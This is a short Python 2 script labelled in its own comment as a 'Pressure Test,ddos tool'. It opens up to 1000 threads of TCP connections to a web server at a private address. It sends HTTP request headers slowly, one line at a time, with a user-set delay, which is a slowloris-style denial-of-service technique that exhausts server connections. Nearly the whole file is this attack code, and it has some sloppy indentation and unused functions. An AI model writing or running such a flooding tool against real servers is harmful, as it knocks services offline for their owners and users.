#!/usr/bin/env python
import socket
import time
import threading
import thread
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=10
PORT=80
HOST="192.168.1.4"
PAGE="/"
MAX=1000
#---------------------------

buf=("GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
         % (PAGE,HOST))

data = range(0,10)
data[0]=("User-Agent: Mozilla/4.0\r\n")
data[1]=("Cookie:lalala\r\n")
data[2]=("Cookie:lalala\r\n")
data[3]=("Cookie:lalala\r\n")
data[4]=("Cookie:lalala\r\n")
data[5]=("Cookie:lalala\r\n")
data[6]=("Cookie:lalala\r\n")
data[7]=("Cookie:lalala\r\n")
data[8]=("Cookie:lalala\r\n")
data[9]=("Cookie:lalala\r\n\r\n")

socks=[]
def conn_thread(): 
        j = 0
	global socks
	for i in range(0,MAX_CONN):
	        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((HOST,PORT))
			s.send(buf)
                        while j<10:
                                s.send(data[j])
                                j = j+1
                                time.sleep(timesleep)
			print "Send buf OK!,conn=%d\n"%i
#			data=s.recv(1024)
#			print len(data)
#			if len(data) > 0:
#				print data
#			socks.append(s)
		except Exception,ex:
			print "Could not connect to server or send error:%s"%ex

def send_thread():  
	global socks
	print len(socks)
	j=0
	while True:
		for s in socks:
			try:
				s.send("fa")
				print "send socks OK\n!"
				print "s=%s\n"%s
			#	print s.recv(1024)
			#	s.close()
			except Exception,ex:
				print "Send Exception:%s\n"%ex
				socks.remove(s)
				s.close()
		j=j+1
		print j
			#time.sleep(1)
#end def
def main():
    global timesleep
    timesleep = int(raw_input("please input the time inteval(less than 13 better) between every cookie \you want send \n"))
    print timesleep
    print "machine's cpu too low ,max threads better below 900"
    threads = []
    for i in range(0,MAX):
        t = threading.Thread(target=conn_thread,args=())
        threads.append(t)
    print "already"
    for i in range(0,MAX):
        threads[i].start()
#        threads[i].sleep(1)
#        threads[i].join()
    print "already start"
    for i in range(0,MAX):
        threads[i].join()# join means wait until the child thread run over ,then the main thread start continue run
    print 'all done'
#    conn_thread()
#    send_thread()
    print "lyue"
    return
main()

